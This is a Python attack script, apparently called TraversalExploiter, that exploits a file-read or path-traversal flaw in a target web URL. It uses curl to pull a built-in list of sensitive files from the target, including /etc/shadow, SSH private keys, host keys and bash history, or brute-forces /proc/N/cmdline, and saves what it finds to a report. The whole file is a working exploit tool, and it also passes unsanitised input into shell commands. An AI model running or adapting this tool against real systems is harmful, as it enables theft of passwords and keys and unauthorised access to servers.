#!/bin/env python3
"""
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * Boris Burgarella wrote this file. As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return Poul-Henning Kamp
 * ----------------------------------------------------------------------------
"""

import argparse
import os
import sys

# some nice colors !!
HEADER = '\033[95m'
BLUE = '\033[94m'
CYAN = '\033[96m'
GREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

commonFiles = [	"/etc/issue","/proc/version","/etc/profile","/etc/bashrc", "~/.bash_profile", "~./bashrc", "~/.bash_logout",
	     	   	"/etc/services","/etc/passwd", "/etc/group", "/etc/shadow", "~/.bash_history", "~/.profile","~/.ssh/authorized_keys",
		 		"~/.ssh/identity.pub", "~/.ssh/identity", "~/.ssh/id_rsa.pub", "~/.ssh/id_rsa", "~/.ssh/id_dsa.pub", "~/.ssh/id_dsa",
				"/etc/ssh/ssh_config", "/etc/ssh/sshd_config","/etc/ssh/ssh_host_dsa_key.pub", "/etc/ssh/ssh_host_dsa_key",
			 	"/etc/ssh/ssh_host_rsa_key.pub", "/etc/ssh/ssh_host_rsa_key", "/etc/ssh/ssh_host_key.pub", "/etc/ssh/ssh_host_key"]



Header = BLUE + BOLD + """
===============================================================================================================================
_____                                                             _______________              ______                         
__  /_____________ _________________   __________________________ ___  /__  ____/___  ____________  /_________________________
_  __/_  ___/  __ `/_  __ \_  ___/_ | / /  _ \_  ___/_  ___/  __ `/_  /__  __/  __  |/_/__  __ \_  /_  __ \_  ___/  _ \_  ___/
/ /_ _  /   / /_/ /_  / / /(__  )__ |/ //  __/  /   _(__  )/ /_/ /_  / _  /___  __>  < __  /_/ /  / / /_/ /  /   /  __/  /    
\__/ /_/    \__,_/ /_/ /_//____/ _____/ \___//_/    /____/ \__,_/ /_/  /_____/  /_/|_| _  .___//_/  \____//_/    \___//_/     
                                                                                       /_/                                    
														    by Trefle
===============================================================================================================================
""" + ENDC

def print_with_colors(Text_str, color, **kwargs):
    print(color + Text_str + ENDC, **kwargs)



if __name__ == "__main__":
	# mandatory header print :P
	print(Header)
	# get the args
	
	if os.path.exists("vulnUrl.txt"):	
		with open('vulnUrl.txt','r') as file:
			url = file.read()
	else:
		url = input("No saved url found, please enter the target vulnerable url:\n")
		print("Thank you ! this url will be saved in a file name vulnUrl.txt in the working directory")
		with open('vulnUrl.txt','w') as file:
			file.write(url) 

	if sys.argv[-1] == "--brute-force-cmdline" or sys.argv[-1] == "-bfc":
		with open("trReport.txt","w") as file:
			for i in range(int(sys.argv[-2])):
				command = "curl -s {}/proc/{}/cmdline".format(url, i)
				print_with_colors("Getting the content of the file: {}/proc/{}/cmdline                         ".format(url, i),BLUE, end='\r')
				result = os.popen(command).read()
				if result.strip() != '':
					print("\nFound something !")
					file.write(BLUE + "\nContent of the file:/proc/{}/cmdline\n===========================\n".format(url, i) + ENDC)
					file.write(result)
					os.fsync(file.fileno())




	if sys.argv[-1] == "--common-files" or sys.argv[-1] == "-cf":
		with open("trReport.txt","w") as file:	
			for path in commonFiles:
				command = "curl -s {}{}".format(url, path)
				print_with_colors("Getting the content of the file: {}".format(path),BLUE)
				result = os.popen(command).read()
				if result.strip() != '':
					file.write(BLUE + "\nContent of the file:{}\n===========================\n".format(path) + ENDC)
					file.write(result)
	else:
		path = sys.argv[-1]
		command = "curl {}{}".format(url, path)
		print_with_colors("Getting the content of the file:\n===========================",BLUE)
		result = os.popen(command).read()
		print_with_colors("\nContent of the file:\n===========================",BLUE)
		print(result)
